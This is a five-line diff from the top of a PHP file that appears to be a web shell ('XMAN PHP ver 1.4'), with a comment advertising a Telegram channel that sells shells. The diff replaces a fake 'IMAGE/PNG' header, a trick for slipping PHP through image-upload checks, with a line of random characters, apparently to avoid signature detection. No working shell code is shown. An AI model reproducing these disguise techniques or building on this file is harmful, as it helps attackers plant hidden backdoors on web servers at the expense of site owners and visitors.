@@ -1,4 +1,5 @@
-﻿IMAGE/PNG<?pHp
+﻿eaiovnaovbqoebvqoeavibavo
+<?pHp
 /* XMAN PHP ver 1.4 [ buy shells https://t.me/buyshell_molasazy ] */
 
 // Configuration — do not change manually!
